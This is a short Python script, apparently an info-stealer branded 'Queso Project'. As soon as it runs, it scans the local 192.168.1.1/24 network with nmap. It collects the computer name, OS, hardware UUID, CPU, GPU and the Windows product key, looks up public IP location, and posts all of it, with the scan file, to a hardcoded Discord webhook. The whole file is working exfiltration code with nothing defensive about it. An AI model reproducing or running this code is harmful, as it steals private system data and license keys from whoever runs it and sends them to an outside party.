import os
import subprocess
import json
from urllib3 import PoolManager
import nmap3
from xml.etree import ElementTree


def SendData() -> None:
    nmap = nmap3.Nmap()
    scan = nmap.scan_command("192.168.1.1/24", arg="-sV -T4 -O -F --version-light")

    computerName = os.getenv("computername")
    computerOS = subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().splitlines()[2].strip()
    uuid = subprocess.run('wmic csproduct get uuid', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()[1]
    cpu = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:System\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name PROCESSOR_IDENTIFIER", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip()
    gpu = subprocess.run("wmic path win32_VideoController get name", capture_output= True, shell= True).stdout.decode(errors= 'ignore').splitlines()[2].strip()
    productKey = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip()

    http = PoolManager()

    try:
        r: dict = json.loads(http.request("GET", "http://ip-api.com/json/").data.decode())
        if r.get("status") != "success":
            raise Exception("Failed to retrieve IP info")
        data = f"""
            \nIP: {r['query']}
            \nRegion: {r['regionName']}
            \nCountry: {r['country']}
            \nTimezone: {r['timezone']}
        """
    except Exception:
        ip_info = "(No IP info)"
    else:
        ip_info = data

    sys_info = f"""
        \nComputer Name: {computerName}
        \nOS: {computerOS}
        \nUUID: {uuid}
        \nCPU: {cpu}
        \nGPU: {gpu}
        \nProduct Key: {productKey}
    """

    payload = {
        "embeds": [
            {
                "title": "Queso Project",
                "description": f"""
                    __System Info__
                    \n```autohotkey\n{sys_info}```
                    \n__IP Info__
                    \n```prolog\n{ip_info}```
                """,
                "footer": {
                    "text": "Information by Queso"
                }
            }
        ],
        "username": "Queso"
    }

    fields = dict()
    fields['file'] = ("scan.json", ElementTree.tostring(scan, encoding="utf-8"))
    fields['payload_json'] = json.dumps(payload).encode()
    http.request("POST", "https://discord.com/api/webhooks/1122499476712595519/FuVEZ0l0t3rXCjDcs_I8FrFY1Q1SlUGMdvjghQL31G0yOFWlBKJbQnL_MBHOWMkMs09q", fields= fields)

SendData()